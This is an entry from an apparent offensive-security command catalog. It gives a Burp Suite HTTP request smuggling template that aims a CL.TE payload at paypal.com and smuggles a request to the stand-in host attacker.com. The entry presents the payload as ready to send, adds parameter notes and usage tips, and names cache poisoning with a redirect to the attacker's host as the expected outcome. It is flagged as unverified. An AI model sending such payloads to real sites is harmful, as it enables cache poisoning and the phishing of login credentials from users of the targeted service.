---
data: |+
  POST /some-page HTTP/1.1
  Host: paypal.com
  Content-Length: 0
  Transfer-Encoding: chunked

  0
  GET /signin HTTP/1.1
  Host: attacker.com

tags:
  - http-request-smuggling
type: command
executor: burp
platforms:
  - Web
id: c5557e89-d150-41b8-a6dc-a58c76b481eb
created_at: '2025-12-11T03:47:59.459Z'
updated_at: '2025-12-11T03:47:59.459Z'
verified: false
validated: true
submitted: true
---
# burp-request-manipulation

## Command

```http
POST /some-page HTTP/1.1
Host: paypal.com
Content-Length: 0
Transfer-Encoding: chunked

0
GET /signin HTTP/1.1
Host: attacker.com

```

## Description

This Burp Suite request template manipulates HTTP headers to perform request smuggling, ideal for crafting precise payloads in a GUI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `POST /some-page` | Target endpoint | Yes |
| `Content-Length: 0` | Zero length for smuggling | Yes |
| `Transfer-Encoding: chunked` | Chunked encoding | Yes |
| `0
GET ...` | Smuggled request | Yes |

## Examples

### Basic Usage

Use Burp Repeater to send the request.

### Advanced Usage

Modify the smuggled GET to include custom headers.

## Expected Output

Cache poisoning success, with the target page redirecting to the specified host.

## Related

- [[commands/curl-http-smuggling]]
- [[procedures/Craft-Smuggling-Request-for-Cached-Redirect]]
